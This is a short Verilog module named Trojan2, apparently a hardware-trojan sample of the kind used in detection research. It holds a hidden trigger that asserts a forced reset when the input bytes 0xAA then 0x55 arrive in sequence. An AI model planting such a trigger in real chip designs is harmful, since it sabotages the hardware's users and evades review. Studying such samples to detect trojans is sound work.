module Trojan2 (
    input wire clk,
    input wire rst,
    input wire [7:0] data_in,
    output reg force_reset
);
    reg [7:0] prev_data;
    wire trigger = (prev_data == 8'hAA && data_in == 8'h55);
    always @(posedge clk or posedge rst) begin
        if (rst)
            prev_data <= 8'b0;
        else
            prev_data <= data_in;
    end
    always @(posedge clk or posedge rst) begin
        if (rst)
            force_reset <= 1'b0;
        else
            force_reset <= trigger;
    end
endmodule